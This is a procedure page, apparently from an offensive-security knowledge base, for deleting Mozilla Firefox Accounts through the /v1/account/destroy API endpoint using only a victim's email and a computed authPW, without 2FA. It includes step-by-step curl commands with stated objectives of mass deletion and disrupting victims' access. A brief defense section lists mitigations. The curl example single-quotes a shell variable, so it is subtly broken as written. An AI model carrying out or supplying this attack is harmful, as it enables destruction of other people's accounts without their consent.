---
id: proc-002
tags:
  - api-exploit
  - account-deletion
  - auth-bypass
type: procedure
tools: []
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/curl-delete-account]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:32:39.085Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[Exploit Public-Facing Application]]'
---
# Send-Account-Deletion-Request

## Summary

This procedure sends a POST request to the /v1/account/destroy endpoint using the computed authPW and email, resulting in unauthenticated account deletion without 2FA or Authorization header enforcement.

## Description

The Mozilla Firefox Accounts API endpoint /v1/account/destroy accepts requests with only email and authPW, computed from the password via PBKDF2. No 2FA is checked, and omitting the Authorization header allows the request to proceed if the authPW matches. This enables attackers to delete accounts en masse if passwords are leaked, with rate limiting (100 attempts per account) that doesn't hinder targeting multiple victims. The endpoint is public-facing and exploitable over HTTPS.

## Requirements

1. Computed authPW from the victim's credentials
2. Victim's email address
3. curl or similar HTTP client
4. Internet access to api-accounts.stage.mozaws.net (or production equivalent)

## Defense

Defensive measures and detection strategies:

- Enforce 2FA for all destructive actions, even password-authenticated ones
- Require session tokens or Authorization headers for account management APIs
- Log and alert on deletion requests without 2FA context or from suspicious IPs
- Implement global rate limiting across accounts to prevent mass deletions

## Objectives

1. Delete the target account without user interaction
2. Bypass authentication and 2FA protections
3. Disrupt user access to Firefox services

## Instructions

### Step 1: Craft the Payload

**Context**: Prepare the JSON body with email and authPW, ensuring no Authorization header is included.

**Command** ([[commands/curl-delete-account]]):
```bash
# Prepare payload
JSON_PAYLOAD='{"email":"victim@example.com","authPW":"computed_authpw_hash_here"}'
```

> The payload must use exact email casing; authPW must be base64-encoded from PBKDF2.

### Step 2: Send the Request

**Context**: POST to the destroy endpoint to trigger deletion.

**Command** ([[commands/curl-delete-account]]):
```bash
curl -X POST https://api-accounts.stage.mozaws.net/v1/account/destroy \
  -H "Content-Type: application/json" \
  -d '$JSON_PAYLOAD'
```

> If successful, expect {"success":true}; failures include mismatch errors (e.g., invalid authPW). Note: Adding a mismatched Authorization header causes failure.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]] Impact

### Techniques

- [[Valid Accounts]] Valid Accounts
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/curl-delete-account]]

## Tools Used


## Tags

- api-exploit
- account-deletion
